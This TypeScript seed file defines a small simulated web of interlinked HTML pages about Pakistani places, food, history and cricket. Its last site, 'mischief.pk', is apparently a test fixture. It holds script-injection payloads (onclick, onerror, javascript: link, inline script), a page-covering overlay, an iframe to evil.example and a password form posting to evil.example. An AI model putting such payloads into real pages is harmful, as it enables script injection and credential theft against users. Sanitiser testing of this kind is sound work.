export const PEOPLE = ["Ayesha Malik", "Hamza Qureshi", "Zainab Siddiqui", "Mariam Chaudhry", "Bilal Khan", "Usman Farooqui"] as const;
export type PersonName = (typeof PEOPLE)[number];

export interface SeedRevision {
  title: string;
  html: string;
  publishedAt: number;
}

export interface SeedSite {
  address: string;
  author: PersonName;
  revisions: SeedRevision[];
}

const link = (address: string, label: string) => `<a href="${address}">${label}</a>`;

export const SITES: SeedSite[] = [
  {
    address: "karakoram.pk",
    author: "Hamza Qureshi",
    revisions: [
      {
        title: "Karakoram Notes",
        publishedAt: -2880,
        html: `<h1>Karakoram Notes</h1>
<p>The Karakoram is a range of rock and ice in the far north of Pakistan, home to K2, the second highest mountain on earth at 8,611 metres. It also holds some of the longest glaciers outside the polar regions. The Baltoro Glacier runs for about sixty kilometres, and trekkers follow it to Concordia, where several of the world's tallest peaks stand in one view.</p>
<p>The Karakoram Highway is the road that made the north reachable. It climbs from the plains through Gilgit and the Hunza valley to the Khunjerab Pass, which at 4,693 metres is among the highest paved border crossings anywhere. Landslides close it often, and travellers learn to treat a schedule as a suggestion.</p>
<p>Read the ${link("hunza.pk", "Hunza valley journal")} for the orchards and forts along the road, and the ${link("skardu.pk", "Skardu and Deosai notes")} for the high plateau to the south. A complete atlas of every peak and pass is promised at ${link("gilgit-baltistan-atlas.pk", "the Gilgit-Baltistan atlas")}.</p>`
      },
      {
        title: "Karakoram Notes: the mountains the river cuts through",
        publishedAt: 30,
        html: `<h1>Karakoram Notes</h1>
<p>The Karakoram is a range of rock and ice in the far north of Pakistan, home to K2, the second highest mountain on earth at 8,611 metres. It also holds some of the longest glaciers outside the polar regions. The Baltoro Glacier runs for about sixty kilometres, and trekkers follow it to Concordia, where several of the world's tallest peaks stand in one view.</p>
<p>The Karakoram Highway is the road that made the north reachable. It climbs from the plains through Gilgit and the Hunza valley to the Khunjerab Pass, which at 4,693 metres is among the highest paved border crossings anywhere. Landslides close it often, and travellers learn to treat a schedule as a suggestion.</p>
<p>Everything here drains south. The meltwater feeds the ${link("indusriver.pk", "Indus")}, which cuts through the mountains and carries them to the sea as silt. Read the ${link("hunza.pk", "Hunza valley journal")} for the orchards and forts along the road, and the ${link("skardu.pk", "Skardu and Deosai notes")} for the high plateau. This page has been rewritten; the atlas of every peak and pass is still promised at ${link("gilgit-baltistan-atlas.pk", "the Gilgit-Baltistan atlas")}.</p>`
      }
    ]
  },
  {
    address: "hunza.pk",
    author: "Hamza Qureshi",
    revisions: [
      {
        title: "Hunza Valley Journal",
        publishedAt: -2700,
        html: `<h1>Hunza Valley Journal</h1>
<p>In spring the Hunza valley turns white and pink with apricot and cherry blossom, and in summer the apricots are laid out on rooftops to dry in the sun. Dried apricots, walnuts and mulberries are what people carry down the valley to sell. The kernel of the apricot is pressed for oil, and nothing is wasted.</p>
<p>Karimabad is the main town, overlooked by Baltit Fort, which stands on a ridge and is several centuries old. Further up the valley is Attabad Lake, which did not exist before a landslide in 2010 blocked the river; the road now runs through tunnels along its blue-green shore. Rakaposhi and Ultar Sar fill the horizon on a clear morning.</p>
<p>The valley sits on the ${link("karakoram.pk", "Karakoram Highway")}, and the ${link("skardu.pk", "road to Skardu")} branches off nearby. In the evenings people drink salt tea; the ${link("chaikhana.pk", "chai khana notes")} write about it.</p>`
      }
    ]
  },
  {
    address: "skardu.pk",
    author: "Hamza Qureshi",
    revisions: [
      {
        title: "Skardu and Deosai",
        publishedAt: -2600,
        html: `<h1>Skardu and Deosai</h1>
<p>Skardu is the gateway to the highest country on earth. From here jeeps climb for hours to Deosai, a plateau that sits above four thousand metres and is covered in wildflowers for a few short weeks each summer. It is one of the highest plains in the world and is a national park, home to the Himalayan brown bear, marmots and golden eagles.</p>
<p>The plateau is cold and windy even in July, and the road is closed by snow for much of the year. Near Skardu itself are Shangrila, a lake and orchard resort with a famous red-roofed building, and the Shigar valley with its old fort. Boats cross the Indus where it runs wide and brown through the town.</p>
<p>The mountains behind it are described in the ${link("karakoram.pk", "Karakoram notes")}, and the green valley to the north in the ${link("hunza.pk", "Hunza journal")}. Wildlife counts are kept at ${link("deosai-wildlife.pk", "the Deosai wildlife record")}.</p>`
      }
    ]
  },
  {
    address: "lahorenama.pk",
    author: "Ayesha Malik",
    revisions: [
      {
        title: "Lahore Nama",
        publishedAt: -2500,
        html: `<h1>Lahore Nama</h1>
<p>The Walled City of Lahore is best entered at dawn, through the Delhi Gate, when the bakers are already at work and the lanes smell of fresh naan. Behind the gate the street narrows to a market of copper, spices and shoes, and the old havelis lean over it with carved wooden balconies. The Wazir Khan Mosque, covered inside and out in tile and fresco, is the one building every visitor is told not to miss.</p>
<p>Lahoris will tell you that the city is its food. Breakfast is halwa puri or nihari, lunch is whatever the family argues about, and the evening belongs to Food Street near the Badshahi Mosque, where the fort walls are lit up and the grills never stop. Anarkali Bazaar is where you buy cloth, and Gawalmandi is where you eat afterwards.</p>
<p>The great monuments are in the ${link("mughalnama.pk", "Mughal Nama")}. For what to eat, see ${link("dastarkhwan.pk", "Dastarkhwan")}. And on a summer evening, half the city is playing or watching ${link("cricketnama.pk", "cricket")}.</p>`
      }
    ]
  },
  {
    address: "mughalnama.pk",
    author: "Ayesha Malik",
    revisions: [
      {
        title: "Mughal Nama",
        publishedAt: -2400,
        html: `<h1>Mughal Nama</h1>
<p>The Mughals left their grandest Pakistani monuments in Lahore. The Lahore Fort, rebuilt and extended by one emperor after another, contains the Sheesh Mahal, a palace room set with tiny mirrors, and the Alamgiri Gate that opens onto the Badshahi Mosque. The mosque was completed in the seventeenth century and for generations was among the largest in the world; its courtyard still holds tens of thousands at prayer.</p>
<p>A short drive away are the Shalimar Gardens, laid out on three descending terraces with marble pavilions and hundreds of fountains. The Lahore Fort and the Shalimar Gardens are together a UNESCO World Heritage Site. Nearby is the tomb of the emperor Jahangir, set in a garden across the river, and the delicate tilework of the Wazir Khan Mosque.</p>
<p>Mughal builders worked across the country, from the mosque of Mahabat Khan in ${link("peshawarnama.pk", "Peshawar")} to the old capital at Thatta, whose great necropolis is recorded at ${link("makli-necropolis.pk", "the Makli necropolis")}. Start in the city itself with ${link("lahorenama.pk", "Lahore Nama")}.</p>`
      }
    ]
  },
  {
    address: "dastarkhwan.pk",
    author: "Zainab Siddiqui",
    revisions: [
      {
        title: "Dastarkhwan",
        publishedAt: -2300,
        html: `<h1>Dastarkhwan</h1>
<p>A dastarkhwan is the cloth laid on the floor for a meal, and in Pakistan it is rarely laid for fewer than ten. Karachi biryani is sharp with tomato and green chilli and eaten with raita. Lahore does nihari, beef or mutton stewed overnight and eaten at breakfast with naan, ginger and lemon, and haleem, a thick porridge of lentils, wheat and meat topped with fried onions.</p>
<p>In Peshawar the chapli kebab is a flat, spiced mince patty fried in beef fat, served on a naan with tomato. In Punjab the winter breakfast is halwa puri, a fried bread with a sweet semolina halwa and a chickpea curry. Summer means lassi, falooda and gola ganda; Ramazan means pakoras and samosas laid out at sunset, and a table that no one wants to leave.</p>
<p>The city that eats best is argued over. Start with ${link("lahorenama.pk", "Lahore Nama")}, then drink tea at the ${link("chaikhana.pk", "chai khana")}, walk the kebab stalls of ${link("peshawarnama.pk", "Peshawar")}, and finish with the biryani at the ${link("karachisea.pk", "Karachi seafront")}.</p>`
      }
    ]
  },
  {
    address: "chaikhana.pk",
    author: "Zainab Siddiqui",
    revisions: [
      {
        title: "Chai Khana",
        publishedAt: -2200,
        html: `<h1>Chai Khana</h1>
<p>Tea in Pakistan is made by boiling the leaves with milk, sugar and sometimes cardamom, until it is dark and sweet. This is doodh patti, and it is served at every roadside dhaba, from truck stops on the Grand Trunk Road to a table on a Karachi pavement at midnight. In the north and in Peshawar, many prefer kahwa, a green tea scented with cardamom, drunk without milk after a heavy meal.</p>
<p>In Kashmir and parts of Punjab there is also noon chai, a pink salted tea made with baking soda and milk, served at weddings and winter mornings with bakery biscuits. In Hunza, tea is often made with salt and butter. In all cases the rule is the same: nobody visits and leaves without a cup, and refusing is the more difficult option.</p>
<p>What to eat with it is at ${link("dastarkhwan.pk", "Dastarkhwan")}. The tea houses of ${link("peshawarnama.pk", "Peshawar")} are famous, and the mountain version of the habit is described in the ${link("hunza.pk", "Hunza journal")}.</p>`
      }
    ]
  },
  {
    address: "peshawarnama.pk",
    author: "Zainab Siddiqui",
    revisions: [
      {
        title: "Peshawar Nama",
        publishedAt: -2100,
        html: `<h1>Peshawar Nama</h1>
<p>Peshawar is among the oldest living cities in South Asia, and for centuries it has been the last stop before the Khyber Pass. Caravans, armies and traders have all passed through it. The old city is entered through Qissa Khwani Bazaar, the Street of Storytellers, where travellers once sat in tea houses and listened to tales told by others who had come from Kabul and Central Asia.</p>
<p>The Bala Hisar fort looks over the city from a mound to the west. The Mahabat Khan Mosque, built in the seventeenth century, has white marble domes and painted ceilings; its courtyard is a calm place after the bazaar. Islamia College, with its red-brick buildings and long lawns, is a landmark of the university town. In the evening the smoke from the kebab grills rises over the lanes.</p>
<p>Sit down at a tea house, as described by the ${link("chaikhana.pk", "chai khana")}, and try the chapli kebab in the ${link("dastarkhwan.pk", "Dastarkhwan")}. The mosque is one of the ${link("mughalnama.pk", "Mughal monuments")}. The road out of town is recorded at ${link("khyber-pass.pk", "the Khyber Pass pages")}.</p>`
      }
    ]
  },
  {
    address: "karachisea.pk",
    author: "Mariam Chaudhry",
    revisions: [
      {
        title: "Karachi by the Sea",
        publishedAt: -2000,
        html: `<h1>Karachi by the Sea</h1>
<p>Karachi is Pakistan's biggest city and its only real port, a place of fast traffic and slow evenings. The sea breeze arrives in the afternoon and the whole city goes to the water: to Clifton, where families walk the promenade eating gola ganda; to Hawke's Bay and Sandspit, where fishing boats are drawn up on the sand; and to Manora Island, reached by a short ferry ride from the harbour.</p>
<p>The city is built of layers. There is the colonial centre around Frere Hall and the stone buildings of Saddar, the white marble tomb of the founder of the country, and the endless bazaars of Empress Market. South-east of the city, the mangroves of the Indus delta shelter fish, crabs and migratory birds. In winter, flamingos stand in the creeks.</p>
<p>Everything here ends with the ${link("indusriver.pk", "Indus")}, which reaches the sea at this coast. Plates of biryani are described in ${link("dastarkhwan.pk", "Dastarkhwan")}, and the national stadium is part of the story of ${link("cricketnama.pk", "cricket")}. Green turtles nest on a beach whose conservation is recorded at ${link("turtle-beach.pk", "the turtle beach pages")}.</p>`
      }
    ]
  },
  {
    address: "indusriver.pk",
    author: "Mariam Chaudhry",
    revisions: [
      {
        title: "The Indus",
        publishedAt: -1900,
        html: `<h1>The Indus</h1>
<p>The Indus is the river that Pakistan is built around. It rises in Tibet, runs through Ladakh and the mountains of the ${link("karakoram.pk", "Karakoram")}, and then crosses the plains of Punjab and Sindh for well over three thousand kilometres before it reaches the Arabian Sea. Almost every field in the country depends on its water, carried by canals built over the last century and a half.</p>
<p>It is also a river of floods. In 2022 monsoon rains and glacier melt put a third of the country under water, and the plains of Sindh became a single lake. In the delta the opposite problem is common: with less water reaching the sea, salt water moves inland and the mangroves shrink. The rare Indus river dolphin, nearly blind and found nowhere else, still swims in the stretch below Sukkur.</p>
<p>Five thousand years ago, a whole civilisation lived along these banks; read about its great city at ${link("mohenjodaro.pk", "Mohenjo-daro")}. Where the river ends is described in ${link("karachisea.pk", "Karachi by the Sea")}.</p>`
      }
    ]
  },
  {
    address: "mohenjodaro.pk",
    author: "Mariam Chaudhry",
    revisions: [
      {
        title: "Mohenjo-daro",
        publishedAt: -1800,
        html: `<h1>Mohenjo-daro</h1>
<p>Mohenjo-daro stands on the banks of the Indus in Sindh. It was built about four and a half thousand years ago and was one of the largest cities of the Indus Valley civilisation, which was contemporary with ancient Egypt and Mesopotamia. Its streets were laid out in a grid, its houses were built of fired brick, and almost every house had a bathroom and a drain that emptied into covered sewers running under the lanes.</p>
<p>The most famous building is the Great Bath, a large waterproof pool lined with brick and bitumen. Nobody is sure whether it was religious or civic. The people of the city wrote in a script that has never been deciphered, and left behind seals, weights and small figures. Why the city was abandoned is still debated. The site became a UNESCO World Heritage Site in 1980, and floods and salt continue to threaten its walls.</p>
<p>The river that fed the city is the ${link("indusriver.pk", "Indus")}. Objects from the site are kept in museums, including the one in Lahore described by ${link("lahorenama.pk", "Lahore Nama")}. The sister city is recorded at ${link("harappa-museum.pk", "the Harappa museum pages")}.</p>`
      }
    ]
  },
  {
    address: "cricketnama.pk",
    author: "Bilal Khan",
    revisions: [
      {
        title: "Cricket Nama",
        publishedAt: -1700,
        html: `<h1>Cricket Nama</h1>
<p>Every Pakistani street is a cricket pitch in waiting. The game is played with a tennis ball wrapped in tape, a plank for a bat, and a wall for the wickets, and the rules change with the width of the lane. The professional game grew out of these lanes. Pakistan won the World Cup in 1992 in Melbourne under Imran Khan, and the final is still the match that every fan is asked about.</p>
<p>The country is known for fast bowling. Wasim Akram and Waqar Younis made the ball reverse-swing late and fast, and a generation of bowlers learned from them. Gaddafi Stadium in Lahore and the National Stadium in Karachi are the grounds where most of the big days have happened. When Pakistan plays India, the streets empty, and the shops put televisions on the pavement.</p>
<p>Lahore's grounds are described in ${link("lahorenama.pk", "Lahore Nama")}, and the Karachi ground is on the ${link("karachisea.pk", "Karachi seafront")}. After the match, everyone goes to eat at ${link("dastarkhwan.pk", "Dastarkhwan")}.</p>`
      }
    ]
  },
  {
    address: "mischief.pk",
    author: "Bilal Khan",
    revisions: [
      {
        title: "Mischief",
        publishedAt: -1600,
        html: `<h1 onclick="alert('owned')">Mischief</h1>
<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:red">This page tries to cover the whole browser.</p>
<script>document.body.innerHTML = "owned";</script>
<style>body { display: none }</style>
<iframe src="https://evil.example"></iframe>
<img src="x" onerror="alert(1)">
<form action="https://evil.example"><input name="password"></form>
<p>Links: ${link("karakoram.pk", "a real address")}, <a href="https://example.com">an outside site</a>, <a href="javascript:alert(1)">a script link</a>, and a <a href="karakoram.pk/secret/path">path</a>.</p>
<p>Everything above this line was written by someone hoping to escape the page they published on.</p>`
      }
    ]
  }
];
